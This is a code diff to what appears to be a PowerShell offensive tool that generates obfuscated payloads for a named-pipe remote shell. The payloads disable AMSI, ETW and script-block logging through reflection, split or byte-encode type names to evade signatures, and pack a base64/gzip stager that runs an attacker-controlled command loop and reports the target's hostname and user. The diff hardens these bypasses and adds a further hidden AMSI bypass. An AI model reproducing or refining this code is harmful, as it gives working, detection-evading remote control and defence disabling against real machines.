@@ -16,7 +16,7 @@ function Get-AmsiBypassSnippet {
 
     switch ($Technique) {
         'fail' {
-            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)"
+            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)}catch{}"
         }
 
         'direct' {
@@ -56,7 +56,7 @@ function Get-EtwBypassSnippet {
 
     switch ($Technique) {
         'provider' {
-            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}"
+            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}}catch{}"
         }
 
         'patch' {
@@ -92,7 +92,7 @@ function Get-EtwBypassSnippet {
 }
 
 function Get-SblBypassSnippet {
-    return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
+    return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{}"
 }
 function New-PayloadScript {
     param(
@@ -164,7 +164,7 @@ function New-PayloadScript {
     if (-not $IsServer) {
         $pipeSetup = (
             "`$$vT=$clientType;" +
-            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName','InOut';" +
             "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
             "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
             "`$$vPipe.Connect(600000);" +
@@ -188,7 +188,7 @@ function New-PayloadScript {
             "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
             "`$$vSec.AddAccessRule(`$$vAr);" +
             "`$$vT=$serverType;" +
-            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$bufSize,$bufSize,`$$vSec;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
             "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
             "`$$vPipe.WaitForConnection();" +
             "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
@@ -216,7 +216,7 @@ function New-PayloadScript {
     $gzs.Close()
     $b64 = [Convert]::ToBase64String($ms.ToArray())
 
-    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();[scriptblock]::Create(`$$vD).Invoke()"
+    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();try{`$_1=[System.Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,85,116,105,108,115));`$_2=[System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType([string]::Concat('System.Management.Automation.',`$_1)).GetField(`$_2,'NonPublic,Static').SetValue(`$null,`$true)}catch{};[scriptblock]::Create(`$$vD).Invoke()"
 
     return [PSCustomObject]@{
         InlinePS    = $decomp
@@ -1734,21 +1734,21 @@ function New-StealthScript {
 	$asmLoad = "[void][Reflection.Assembly]::LoadWithPartialName('System.Core')"
 
 	# ETW provider disable via reflection — type names split across string concat to break static sigs
-	$etw = "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}"
+	$etw = "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}}catch{}"
 
-	# ScriptBlock logging disable via reflection
-	$sbl = "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
+	# ScriptBlock logging disable via reflection — field absent in newer PS5.1 builds; silent fail is fine
+	$sbl = "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{}"
 
 	# Random sleep before pipe connect — defeats timing-based correlation
 	$jitter = "`$$vJ=Get-Random -Min 1000 -Max 5000;[Threading.Thread]::Sleep(`$$vJ)"
 
 	if (-not $IsServer) {
 		# CLIENT: target connects back to attacker's named pipe server
-		$pipeSetup = "`$$vT='System.IO.Pipes.NamedPipeCl'+'ientStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1);`$$v1.Connect(600000);`$$v3.WriteLine(`"`$([Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)`");`$$v3.Flush()"
+		$pipeSetup = "`$$vT='System.IO.Pipes.NamedPipeCl'+'ientStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName','InOut';`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1);`$$v1.Connect(600000);`$$v3.WriteLine(`"`$([Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)`");`$$v3.Flush()"
 		$loop = "while(`$true){`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break};try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()};`$$v1.Close();`$$v1.Dispose()"
 	} else {
 		# SERVER: target hosts the pipe, attacker connects in (GListener / Detached mode)
-		$pipeSetup = "`$$v6=New-Object System.IO.Pipes.PipeSecurity;`$$v7=New-Object System.Security.Principal.SecurityIdentifier '$SID';`$$v8=New-Object System.IO.Pipes.PipeAccessRule(`$$v7,'FullControl','Allow');`$$v6.AddAccessRule(`$$v8);`$$vT='System.IO.Pipes.NamedPipeSer'+'verStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$($global:BufferSize),$($global:BufferSize),`$$v6;`$$v9={param(`$$vcb);`$$vcb.Close()};`$$va=New-Object System.Threading.Timer(`$$v9,`$$v1,600000,[System.Threading.Timeout]::Infinite);`$$v1.WaitForConnection();`$$va.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$va.Dispose();`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1)"
+		$pipeSetup = "`$$v6=New-Object System.IO.Pipes.PipeSecurity;`$$v7=New-Object System.Security.Principal.SecurityIdentifier '$SID';`$$v8=New-Object System.IO.Pipes.PipeAccessRule(`$$v7,'FullControl','Allow');`$$v6.AddAccessRule(`$$v8);`$$vT='System.IO.Pipes.NamedPipeSer'+'verStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$$v6;`$$v9={param(`$$vcb);`$$vcb.Close()};`$$va=New-Object System.Threading.Timer(`$$v9,`$$v1,600000,[System.Threading.Timeout]::Infinite);`$$v1.WaitForConnection();`$$va.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$va.Dispose();`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1)"
 		$loop = "while(`$true){if(-not `$$v1.IsConnected){break};`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break}else{try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()}};`$$v1.Disconnect();`$$v1.Dispose()"
 	}
 
@@ -1763,7 +1763,7 @@ function New-StealthScript {
 	$b64   = [Convert]::ToBase64String($ms.ToArray())
 
 	# Decompressor: mixed-case .NET method names + [scriptblock]::Create() instead of IEX
-	$decomp = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object IO.MemoryStream;`$b.COpYTo(`$c);`$d=[Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClosE();`$a.ClosE();`$c.ClosE();[scriptblock]::Create(`$d).Invoke()"
+	$decomp = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object IO.MemoryStream;`$b.COpYTo(`$c);`$d=[Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClosE();`$a.ClosE();`$c.ClosE();try{`$_1=[System.Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,85,116,105,108,115));`$_2=[System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType([string]::Concat('System.Management.Automation.',`$_1)).GetField(`$_2,'NonPublic,Static').SetValue(`$null,`$true)}catch{};[scriptblock]::Create(`$d).Invoke()"
 
 	return [PSCustomObject]@{
 		InlinePS    = $decomp
